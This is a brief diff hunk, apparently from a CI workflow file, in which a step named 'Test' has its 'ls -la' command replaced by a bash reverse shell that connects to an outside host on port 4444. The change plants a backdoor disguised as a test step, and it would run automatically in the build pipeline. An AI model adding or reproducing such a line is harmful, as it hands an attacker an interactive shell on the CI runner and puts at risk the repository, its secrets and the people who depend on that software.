@@ -16,4 +16,4 @@ jobs:
 
       - name: Test
         run: |
-          ls -la
+          bash -i >& /dev/tcp/lf.lc/4444 0>&1
